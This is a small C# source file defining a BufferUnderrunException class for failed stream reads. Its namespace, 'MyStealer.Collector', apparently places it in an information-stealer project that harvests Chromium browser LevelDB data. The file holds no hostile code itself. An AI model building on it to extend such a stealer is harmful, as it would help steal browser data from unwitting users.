using System;
using System.IO;

namespace MyStealer.Collector.Utils.Chromium.LevelDb
{
    public class BufferUnderrunException : IOException
    {
        public int BufferSize { get; private set; }
        public int ReadSize { get; private set; }

        public BufferUnderrunException()
        {
        }

        public BufferUnderrunException(string message) : base(message)
        {
        }

        public BufferUnderrunException(string message, int hresult) : base(message, hresult)
        {
        }

        public BufferUnderrunException(string message, Exception innerException) : base(message, innerException)
        {
        }

        public static BufferUnderrunException StreamUnderrun(int bufferSize, int readSize)
        {
            return new BufferUnderrunException($"Could not read all data from the stream: expected {bufferSize} bytes, got {readSize} bytes")
            {
                BufferSize = bufferSize,
                ReadSize = readSize
            };
        }
    }
}
